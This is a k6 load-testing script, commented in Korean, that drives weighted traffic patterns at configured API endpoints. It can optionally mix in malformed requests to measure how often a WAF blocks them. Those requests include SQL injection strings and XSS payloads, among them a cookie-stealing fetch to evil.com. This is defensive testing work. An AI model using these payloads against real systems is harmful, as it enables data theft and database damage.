/**
 * k6 Load Test Script — URL 기준 그룹 독립 부하 + 패턴 선택 + 비정상 트래픽
 *
 * ── 시나리오 생성 규칙 ────────────────────────────────────────
 *   같은 URL, 다른 method  → 하나의 시나리오 (RATE req/s 공유, weight로 비율 분배)
 *   다른 URL               → 독립 시나리오   (각각 RATE req/s)
 *
 *   예시 (RATE=56):
 *     /v1/product  → 시나리오 1 (56 req/s)
 *       POST weight:7 → 70%  ~39 req/s
 *       GET  weight:3 → 30%  ~17 req/s
 *     /v1/stress   → 시나리오 2 (56 req/s 독립)
 *       POST         → 100%  56 req/s
 *
 * ── API 설정 (apis.json) ──────────────────────────────────────
 * [
 *   {
 *     "name": "상품 등록",
 *     "url": "http://host/v1/product",
 *     "method": "POST",
 *     "weight": 7,                    ← 같은 URL 내 비율 (생략 시 1)
 *     "body": { "requestid": "{{requestid}}", "uuid": "{{uuid}}", ... },
 *     "expectedStatus": 201
 *   },
 *   {
 *     "name": "상품 조회",
 *     "url": "http://host/v1/product",  ← 같은 URL → 동일 시나리오에 묶임
 *     "method": "GET",
 *     "weight": 3,
 *     "params": { "id": "item{{random6}}", ... },
 *     "expectedStatus": 200
 *   },
 *   {
 *     "name": "stress",
 *     "url": "http://host/v1/stress",   ← 다른 URL → 독립 시나리오
 *     "method": "POST",
 *     "body": { ... },
 *     "expectedStatus": 200
 *   }
 * ]
 *
 * ── 템플릿 변수 ───────────────────────────────────────────────
 *   {{requestid}}  → 12자리 랜덤 숫자 문자열
 *   {{uuid}}       → UUID v4
 *   {{random6}}    → 6자리 랜덤 숫자
 *   {{randomInt}}  → 랜덤 정수 (단독 사용 시 number 타입)
 *
 * ── 환경변수 ─────────────────────────────────────────────────
 *   RATE          - 각 URL 그룹 피크 req/s (기본: 56)
 *   PATTERN       - 트래픽 패턴: rampup | step | spike (기본: rampup)
 *   ABNORMAL_RATE - 비정상 요청 비율 % (기본: 0)
 */

import http from 'k6/http';
import { check } from 'k6';
import { Trend, Rate, Counter } from 'k6/metrics';

// ── 메트릭 정의 ───────────────────────────────────────────────
const customLatency  = new Trend('stress_latency_ms', true);
const customSuccess  = new Rate('stress_success_rate');
const customTotal    = new Counter('stress_total_requests');
const abnormalTotal  = new Counter('stress_abnormal_requests');
const wafBlockRate   = new Rate('stress_waf_block_rate');

// ── 공통 변수 ─────────────────────────────────────────────────
const RATE          = parseInt(__ENV.RATE          || '56');
const PATTERN       = (__ENV.PATTERN     || 'rampup').toLowerCase();
const ABNORMAL_RATE = parseInt(__ENV.ABNORMAL_RATE || '0');

// ── API 설정 로드 ─────────────────────────────────────────────
const TARGET_CONFIGS = JSON.parse(open('../apis.json'));

if (!TARGET_CONFIGS || TARGET_CONFIGS.length === 0) {
  throw new Error('apis.json에 API 설정이 없습니다. 최소 1개 이상의 API를 등록하세요.');
}

// ── URL 기준 그룹핑 ───────────────────────────────────────────
// 같은 URL → 하나의 시나리오 (weight로 method 비율 분배)
// 다른 URL → 독립 시나리오 (각각 RATE req/s)
const URL_GROUPS = [];      // [ [cfg, cfg, ...], [cfg], ... ]
const URL_TO_IDX = {};      // { url: groupIndex }

TARGET_CONFIGS.forEach((cfg) => {
  const url = cfg.url;
  if (URL_TO_IDX[url] === undefined) {
    URL_TO_IDX[url] = URL_GROUPS.length;
    URL_GROUPS.push([]);
  }
  URL_GROUPS[URL_TO_IDX[url]].push(cfg);
});

// ── 그룹 내 가중치 기반 method 선택 ──────────────────────────
function pickFromGroup(group) {
  if (group.length === 1) return group[0];

  const total = group.reduce((s, c) => s + (c.weight || 1), 0);
  let rand = Math.random() * total;
  for (const cfg of group) {
    rand -= (cfg.weight || 1);
    if (rand <= 0) return cfg;
  }
  return group[group.length - 1];
}

const INVALID_PATHS = ['/v1/none', '/v1/admin', '/v1/config', '/v1/unknown', '/v1/test'];

// ── 패턴별 stage 계산 ─────────────────────────────────────────
function buildStages() {
  if (PATTERN === 'step') {
    const steps        = parseInt(__ENV.STEPS        || '4');
    const stepDuration = __ENV.STEP_DURATION         || '1m';
    const sustain      = __ENV.SUSTAIN               || '2m';

    const stages = [];
    for (let i = 1; i <= steps; i++) {
      const stepRate = Math.round(RATE * i / steps);
      stages.push({ duration: '1s',         target: stepRate });
      stages.push({ duration: stepDuration, target: stepRate });
    }
    stages.push({ duration: '1s',    target: RATE });
    stages.push({ duration: sustain, target: RATE });
    return stages;
  }

  if (PATTERN === 'spike') {
    const baseline      = parseInt(__ENV.BASELINE      || '5');
    const warmup        = __ENV.WARMUP                 || '30s';
    const spikeDuration = __ENV.SPIKE_DURATION         || '3m';
    const cooldown      = __ENV.COOLDOWN               || '30s';

    return [
      { duration: warmup,        target: baseline },
      { duration: '5s',          target: RATE     },
      { duration: spikeDuration, target: RATE     },
      { duration: '5s',          target: baseline },
      { duration: cooldown,      target: baseline },
    ];
  }

  // rampup (기본값)
  const rampup   = __ENV.RAMPUP   || '2m';
  const sustain  = __ENV.SUSTAIN  || '3m';
  const rampdown = __ENV.RAMPDOWN || '1m';

  return [
    { duration: rampup,   target: RATE },
    { duration: sustain,  target: RATE },
    { duration: rampdown, target: 0    },
  ];
}

// ── URL 그룹별 독립 시나리오 생성 ────────────────────────────
function buildScenarios() {
  const scenarios = {};

  URL_GROUPS.forEach((group, i) => {
    // 시나리오 레이블: URL 경로 기반
    const urlPath = group[0].url
      .replace(/^https?:\/\/[^/]+/, '')   // 호스트 제거
      .replace(/\//g, '_')
      .replace(/[^\w]/g, '')
      .replace(/^_/, '');
    const label = urlPath || `group${i + 1}`;

    scenarios[`stress_${label}_${i + 1}`] = {
      executor:        'ramping-arrival-rate',
      startRate:       0,
      timeUnit:        '1s',
      preAllocatedVUs: 100,
      maxVUs:          500,
      stages:          buildStages(),
      exec:            'runScenario',
      env:             { GROUP_INDEX: String(i) },
    };
  });

  return scenarios;
}

export const options = {
  scenarios: buildScenarios(),

  thresholds: {
    http_req_duration:   ['p(90)<500', 'p(99)<1000'],
    http_req_failed:     ['rate<0.05'],
    stress_success_rate: ['rate>0.95'],
  },
};

// ── 유틸 함수 ─────────────────────────────────────────────────
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === 'x' ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

function generateRequestId() {
  return String(Math.floor(Math.random() * 1_000_000_000_000)).padStart(12, '0');
}

function getBaseUrl(url) {
  return url.replace(/\/v\d+\/.*$/, '');
}

// ── 템플릿 치환 ───────────────────────────────────────────────
function resolveValue(val) {
  if (typeof val !== 'string') return val;

  if (val === '{{requestid}}') return generateRequestId();
  if (val === '{{uuid}}')      return generateUUID();
  if (val === '{{random6}}')   return String(Math.floor(Math.random() * 1_000_000)).padStart(6, '0');
  if (val === '{{randomInt}}') return Math.floor(Math.random() * 9000) + 1000;

  return val
    .replace(/\{\{requestid\}\}/g, () => generateRequestId())
    .replace(/\{\{uuid\}\}/g,      () => generateUUID())
    .replace(/\{\{random6\}\}/g,   () => String(Math.floor(Math.random() * 1_000_000)).padStart(6, '0'))
    .replace(/\{\{randomInt\}\}/g, () => String(Math.floor(Math.random() * 9000) + 1000));
}

function resolveObject(obj) {
  if (!obj) return null;
  const result = {};
  for (const [k, v] of Object.entries(obj)) {
    result[k] = resolveValue(v);
  }
  return result;
}

// ── HTTP 요청 전송 ────────────────────────────────────────────
function sendRequest(cfg) {
  const method   = (cfg.method || 'POST').toUpperCase();
  const headers  = Object.assign({ 'User-Agent': 'k6-load-test/1.0' }, cfg.headers || {});
  const expected = cfg.expectedStatus || 200;

  let url  = cfg.url;
  let body = null;

  if (method === 'GET' || method === 'DELETE') {
    if (cfg.params) {
      const resolved = resolveObject(cfg.params);
      const qs = Object.entries(resolved)
        .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`)
        .join('&');
      url = `${url}?${qs}`;
    }
  } else {
    if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
    if (cfg.body) {
      body = JSON.stringify(resolveObject(cfg.body));
    }
  }

  let res;
  switch (method) {
    case 'GET':    res = http.get(url,          { headers, tags: { target_url: cfg.url, method } }); break;
    case 'POST':   res = http.post(url,   body, { headers, tags: { target_url: cfg.url, method } }); break;
    case 'PUT':    res = http.put(url,    body, { headers, tags: { target_url: cfg.url, method } }); break;
    case 'PATCH':  res = http.patch(url,  body, { headers, tags: { target_url: cfg.url, method } }); break;
    case 'DELETE': res = http.del(url,    body, { headers, tags: { target_url: cfg.url, method } }); break;
    default:
      console.error(`[ERROR] 지원하지 않는 HTTP 메서드: ${method}`);
      return;
  }

  check(res, {
    [`HTTP ${expected}`]:  (r) => r.status === expected,
    'latency < 500ms':     (r) => r.timings.duration < 500,
  });

  customLatency.add(res.timings.duration);
  customSuccess.add(res.status === expected);
  customTotal.add(1);
}

// ── 비정상 요청 유형명 ────────────────────────────────────────
const ABNORMAL_TYPE_NAMES = [
  '빈 바디',
  '필수 필드 누락 (requestid/uuid 없음)',
  '잘못된 JSON 형식',
  'SQL 인젝션 패턴',
  'XSS 패턴',
  '초대용량 페이로드 (10KB)',
  '잘못된 Content-Type (text/plain)',
  '존재하지 않는 경로',
];

// ── 비정상 요청 전송 ──────────────────────────────────────────
function sendAbnormalRequest(cfg) {
  const typeIdx = Math.floor(Math.random() * 8);
  const baseUrl = getBaseUrl(cfg.url);

  let url            = cfg.url;
  let payload        = '';
  let expectedStatus = 403;
  const headers      = {
    'Content-Type': 'application/json',
    'User-Agent':   'k6-load-test/1.0',
  };

  switch (typeIdx) {
    case 0: payload = ''; break;
    case 1: payload = JSON.stringify({ length: 256 }); break;
    case 2: payload = '{bad:json,missing:quotes}'; break;
    case 3:
      payload = JSON.stringify({
        requestid: "' OR '1'='1'; DROP TABLE users--",
        uuid:      "' UNION SELECT * FROM information_schema.tables--",
        length:    256,
      });
      break;
    case 4:
      payload = JSON.stringify({
        requestid: '<script>alert(document.cookie)</script>',
        uuid:      '<img src=x onerror=fetch("http://evil.com?c="+document.cookie)>',
        length:    256,
      });
      break;
    case 5:
      payload = JSON.stringify({
        requestid: generateRequestId(),
        uuid:      generateUUID(),
        length:    256,
        padding:   'X'.repeat(10240),
      });
      break;
    case 6:
      headers['Content-Type'] = 'text/plain';
      payload = `requestid=${generateRequestId()}&uuid=${generateUUID()}`;
      break;
    case 7:
      url = baseUrl + INVALID_PATHS[Math.floor(Math.random() * INVALID_PATHS.length)];
      payload = JSON.stringify({ requestid: generateRequestId(), uuid: generateUUID(), length: 256 });
      expectedStatus = 404;
      break;
  }

  const res = http.post(url, payload, {
    headers,
    tags: { request_type: 'abnormal', target_url: cfg.url },
  });

  const blocked = res.status === expectedStatus;

  check(res, {
    [`비정상 차단 (${expectedStatus})`]: (r) => r.status === expectedStatus,
  });

  if (!blocked) {
    console.warn(
      `[차단 실패] 유형: ${ABNORMAL_TYPE_NAMES[typeIdx]}` +
      ` | 기대: ${expectedStatus}` +
      ` | 실제: ${res.status}` +
      ` | URL: ${url}`
    );
  }

  abnormalTotal.add(1);
  wafBlockRate.add(blocked);
}

// ── 시나리오 실행 함수 ────────────────────────────────────────
// GROUP_INDEX로 URL 그룹을 찾고, 그룹 내에서 weight 비율로 method 선택
export function runScenario() {
  const groupIdx = parseInt(__ENV.GROUP_INDEX);
  const cfg      = pickFromGroup(URL_GROUPS[groupIdx]);

  if (ABNORMAL_RATE > 0 && Math.random() * 100 < ABNORMAL_RATE) {
    sendAbnormalRequest(cfg);
  } else {
    sendRequest(cfg);
  }
}

// ── 요약 출력 ─────────────────────────────────────────────────
export function handleSummary(data) {
  const dur      = data.metrics.http_req_duration;
  const reqs     = data.metrics.http_reqs;
  const fails    = data.metrics.http_req_failed;
  const abnormal = data.metrics.stress_abnormal_requests;
  const waf      = data.metrics.stress_waf_block_rate;

  const rps      = reqs  ? reqs.values.rate.toFixed(2)         : 'N/A';
  const p90      = dur   ? dur.values['p(90)'].toFixed(2)      : 'N/A';
  const p99      = dur   ? dur.values['p(99)'].toFixed(2)      : 'N/A';
  const failRate = fails ? (fails.values.rate * 100).toFixed(2): 'N/A';
  const abnCnt   = abnormal ? abnormal.values.count            : 0;
  const wafRate  = waf   ? (waf.values.rate * 100).toFixed(2) : 'N/A';

  const groupList = URL_GROUPS.map((group, i) => {
    const url = group[0].url;

    if (group.length === 1) {
      const c      = group[0];
      const method = (c.method || 'POST').toUpperCase();
      const name   = c.name ? `  (${c.name})` : '';
      return `    ${i + 1}. [${method}] ${url} → ${c.expectedStatus || 200}  (~${RATE} req/s)${name}`;
    }

    const total   = group.reduce((s, c) => s + (c.weight || 1), 0);
    const methods = group.map((c, j) => {
      const method = (c.method || 'POST').toUpperCase();
      const w      = c.weight || 1;
      const pct    = (w / total * 100).toFixed(0);
      const erps   = (RATE * w / total).toFixed(1);
      const name   = c.name ? `  (${c.name})` : '';
      const conn   = j === group.length - 1 ? '└──' : '├──';
      return `         ${conn} [${method}] → ${c.expectedStatus || 200}  weight:${w} (${pct}%  ~${erps} req/s)${name}`;
    }).join('\n');

    return `    ${i + 1}. ${url}  (합계 ${RATE} req/s)\n${methods}`;
  }).join('\n');

  const abnSection = ABNORMAL_RATE > 0 ? `
  ── 비정상 트래픽 ─────────────────────────────
  비정상 요청 수  : ${abnCnt} 건
  WAF 차단 성공률 : ${wafRate} %` : '';

  console.log(`
══════════════════════════════════════════════
  k6 테스트 완료  [패턴: ${PATTERN.toUpperCase()}]
══════════════════════════════════════════════
  대상 API (URL 그룹 ${URL_GROUPS.length}개, 총 ~${RATE * URL_GROUPS.length} req/s):
${groupList}
  RPS (전체 합계) : ${rps} req/s
  P90 latency     : ${p90} ms
  P99 latency     : ${p99} ms
  Error rate      : ${failRate} %${abnSection}
══════════════════════════════════════════════`);

  return {};
}
